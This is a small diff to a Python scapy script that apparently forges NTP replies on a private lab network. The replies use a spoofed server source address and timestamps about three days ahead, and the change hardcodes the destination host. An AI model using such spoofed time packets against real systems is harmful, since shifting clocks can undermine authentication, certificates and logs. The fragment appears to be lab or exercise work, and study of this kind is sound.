@@ -3,6 +3,7 @@ from scapy.layers.ntp import NTP
 import time
 
 server_ip = "10.10.10.12"
+dest_ip = "10.10.10.10"
 ref_timestamp = time.time() + 259200
 
 def send_ntp(server, packetsrc, ref_timestamp):
@@ -23,7 +24,7 @@ def send_ntp(server, packetsrc, ref_timestamp):
     ntp_packet.recv = time.time() + 259201
     ntp_packet.sent =time.time() + 259201
 
-    ip_packet = IP(src=server, dst=packetsrc)
+    ip_packet = IP(src=server, dst=dest_ip)
     udp_packet = UDP(dport=123, sport=123)
 
     print("Packet before sending")
